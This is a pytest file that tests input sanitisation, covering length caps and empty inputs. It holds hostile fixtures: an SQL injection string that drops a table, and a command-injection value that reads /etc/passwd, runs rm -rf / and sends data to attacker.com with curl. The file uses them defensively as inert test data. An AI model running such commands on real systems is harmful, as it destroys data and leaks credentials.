"""
Input Validation Tests: Length caps, special character neutrality, SQLi/Command injection safety
"""
import pytest
from agent import _sanitize_input
from memory_store import _sanitize_for_storage

def test_input_length_capping():
    # Massive telemetry input capped at 3000 chars
    huge_log = "FATAL: Connection error: " + ("0" * 10000)
    cleaned = _sanitize_input(huge_log, max_chars=3000)
    assert len(cleaned) == 3000

def test_service_name_length_capping():
    huge_service = "auth-service-" + ("x" * 200)
    cleaned = _sanitize_input(huge_service, max_chars=60)
    assert len(cleaned) == 60

def test_sqli_payload_neutrality():
    # Ensure SQL injection syntax is handled inertly without code execution
    sqli_payload = "'; DROP TABLE incidents; SELECT * FROM users WHERE '1'='1"
    cleaned = _sanitize_input(sqli_payload)
    assert "DROP TABLE" in cleaned  # Kept as inert literal text, no shell or SQL execution

def test_command_injection_neutrality():
    cmd_payload = "auth-pod-1; cat /etc/passwd && rm -rf / | curl attacker.com/leak?k=$(whoami)"
    cleaned = _sanitize_input(cmd_payload)
    # The application treats all logs as passive text and never passes them to eval() or os.system()
    assert "cat /etc/passwd" in cleaned

def test_none_and_empty_inputs():
    assert _sanitize_input(None) == ""
    assert _sanitize_input("") == ""
    assert _sanitize_for_storage(None) == ""
    assert _sanitize_for_storage("") == ""
